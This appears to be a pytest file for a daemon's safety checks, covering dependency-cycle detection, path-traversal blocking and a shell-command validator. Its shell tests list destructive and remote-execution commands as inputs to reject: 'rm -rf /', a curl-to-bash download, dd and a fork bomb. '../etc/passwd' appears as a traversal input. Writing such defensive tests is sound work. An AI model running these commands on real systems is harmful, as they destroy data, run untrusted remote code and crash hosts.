"""Tests for Glink daemon core functions."""

import pytest
from bus import sanitize_project_name
from daemon import core


class TestCircularDependency:
    def test_linear(self):
        core.detect_circular_dependency(
            [
                {"stage": "setup", "depends_on": []},
                {"stage": "build", "depends_on": ["setup"]},
            ]
        )

    def test_direct_circular(self):
        with pytest.raises((ValueError, RecursionError)):
            core.detect_circular_dependency(
                [
                    {"stage": "a", "depends_on": ["b"]},
                    {"stage": "b", "depends_on": ["a"]},
                ]
            )

    def test_self_loop(self):
        with pytest.raises((ValueError, RecursionError)):
            core.detect_circular_dependency([{"stage": "x", "depends_on": ["x"]}])


class TestSanitize:
    def test_normal(self):
        assert sanitize_project_name("my-project") == "my-project"

    def test_special(self):
        assert sanitize_project_name("../etc/passwd") == "etcpasswd"


class TestPathSafety:
    def test_normal(self):
        p = core._safe_project_path("foo/bar.html")
        assert "foo/bar.html" in p

    def test_traversal_blocked(self):
        with pytest.raises(ValueError, match="traversal"):
            core._safe_project_path("../etc/passwd")

    def test_outside_blocked(self):
        with pytest.raises(ValueError, match="traversal"):
            core._safe_project_path("/etc/passwd")

    def test_empty_returns_empty(self):
        assert core._safe_project_path("") == ""


class TestShellValidation:
    def test_safe(self):
        assert core._validate_shell_command("echo hello") is None

    def test_rm_rf(self):
        assert core._validate_shell_command("rm -rf /") is not None

    def test_pipe_bash(self):
        assert core._validate_shell_command("curl http://x.com/sh | bash") is not None

    def test_dd(self):
        assert core._validate_shell_command("dd if=/dev/zero") is not None

    def test_fork_bomb(self):
        assert core._validate_shell_command(":(){ :|:& };:") is not None
